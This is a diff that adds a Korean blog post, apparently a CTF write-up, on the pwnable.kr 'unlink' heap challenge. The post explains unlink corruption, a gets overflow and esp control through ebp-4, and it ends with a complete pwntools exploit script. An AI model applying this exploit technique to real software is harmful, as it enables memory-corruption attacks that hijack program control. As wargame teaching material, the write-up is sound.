@@ -1,0 +1,74 @@
+---
+layout: post
+title: ! "[pwnable.kr] unlink"
+excerpt_separator: <!--more-->
+comments : true
+tags:
+  - pwnable
+  - unlink
+  - heap
+  - chaem
+---
+
+안녕하세요 `chaem`입니당   
+오늘은 pwnable.kr Toddler's Bottle의 마지막 문제인 unlink문제를 보려고합니당  
+문제를 먼저 풀어보고 싶은 사람은 아래 링크로 고고!
+[pwnable.kr](http://pwnable.kr/play.php)  
+
+![]({{ site.baseurl }}/images/chaem/pwnable.kr/unlink_01.PNG)  
+
+우선 문제의 제목대로 unlink문제는 unlink corruption에 관한 문제입니당 후후  
+문제 바이너리를 쭉 살펴봤을 때 보이는 특징은
+1. system함수를 주고있어요!!! shell을 따는 문제라는 것을 알 수 있으며, 나중에 요 함수를 호출할 날이 올 것을 고대하고 있으면 되겠네용
+2. 그 취약하기로 유명한 gets함수로 입력을 받고 있어요!!! overflow 냄새가 납니당 ㅎㅎ
+3. stack /heap 주소를 친절하게 leak해서 알려주고 있어요!!! 주소를 다 알려주었으니 main함수의 ret을 shell주소로 덮을 일만 남았네용
+
+![]({{ site.baseurl }}/images/chaem/pwnable.kr/unlink_02.PNG)  
+
+일단, heap의 구조를 봅시다. fd와 bk의 위치에 주소값을 보면 A<->B<->C 이렇게 서로를 가리키로 있는 것을 볼 수 있습니다.  
+
+![]({{ site.baseurl }}/images/chaem/pwnable.kr/unlink_03.PNG)  
+참고 이미지 출처 : [Heap 영역에서 발생하는 취약점을 알아보자!](https://bpsecblog.wordpress.com/2016/10/06/heap_vuln/)  
+그렇지만 unlink함수를 실행한 후에는 A<->C만 가리키도록 바뀌게됩니다.  
+unlink함수는 어떻게 생겼는지 함 봐봅시다!!
+![]({{ site.baseurl }}/images/chaem/pwnable.kr/unlink_04.PNG)  
+즉, B의 fd와 bk를 조작하여 B를 빼고 A와 C가 서로를 가리키 한다는 것을 알 수 있었죵!  
+![]({{ site.baseurl }}/images/chaem/pwnable.kr/unlink_05.PNG)  
+그리고 위에서 한번 언급했듯이 gets를 사용함으로써 overflow가 발생합니다.  
+a 16개까지는 괜찮았으나 17개부터 segmentation fault!
+이 overflow를 이용해서 B의 fd와 bk까지 우리가 직접 조작할 수 있게되는 것입니다.  
+문제에서 친절하게 stack과 heap의 주소를 leak해주기 때문에 이 주소를 그대로 받아오고, main함수의 return 값을 shell(system함수가 들어있는 함수)함수의 주소로 덮어주면 됩니다.  
+하지만!!!! shell함수가 code영역을 사용하여 쓰기권한이 없기때문에 다른 방법을 더 모색해봐야합니다.  
+![]({{ site.baseurl }}/images/chaem/pwnable.kr/unlink_06.PNG)  
+gdb로 main함수의 마지막 부분을 보면 우리가 일반적으로 알고있는 구조와는 다른 것을 볼 수 있습니다. ebp-4의 값을 ecx레지스터에 넣고 다시 ecx-0x4를 참조해 esp를 조정하기 때문에, 이 esp에서 eip를 설정할 수 있게 됩니다.  
+unlink함수를 보면 ebp를 조작가능한 것을 볼 수 있습니다. 즉 unlink에서부 부터 ebp를 조작하여 최종적으로 esp를 컨트롤할 수 있게 되는것입니다.  
+따라서, heap 주소인 ebp-4에 stack값을 덮어 쓰면, 주소가 가리키는 것보다 4bytes 앞부터 실행될 것입니다. 우리는 heap을 제어할 수 있으므로 그 시점에 shell의 주소를 쓰면 되는 것이죠!  
+![]({{ site.baseurl }}/images/chaem/pwnable.kr/unlink_07.PNG)  
+ebp-0x4의 주소와 문제에서 leak해주는 heap주소의 차이는 0x10입니다. 즉, ebp-0x4의 주소와 A의 시작주소가 0x10차이 나는 것입니다. (B->fd)  
+또한, A->buf에서 16bytes를 계산하여야 B이지만, 이미 4bytes를 포함하여 계산한 것이므로 12byte로 계산해주면 됩니다. (B->bk)  
+
+![]({{ site.baseurl }}/images/chaem/pwnable.kr/unlink_08.PNG)  
+
+```
+#! usr/bin/env python
+from pwn import *
+
+ssh = ssh(user='unlink', host='pwnable.kr', port=2222, password='guest')
+s = ssh.process("/home/unlink/unlink")
+
+s.recvuntil('here is stack address leak: ')
+stack_addr = int(s.recv(10),16)
+s.recvuntil('here is heap address leak: ')
+heap_addr = int(s.recv(10),16)
+
+log.success('Stack leak : ' + hex(stack_addr))
+log.success('Heap leak : ' + hex(heap_addr))
+
+payload = p32(0x080484eb) #call shell
+payload +="A"*12
+payload += p32(heap_addr+12) #B->bk
+payload += p32(stack_addr+0x10) #B->fd
+
+s.sendlineafter('get shell!\n', payload)
+s.interactive()
+```
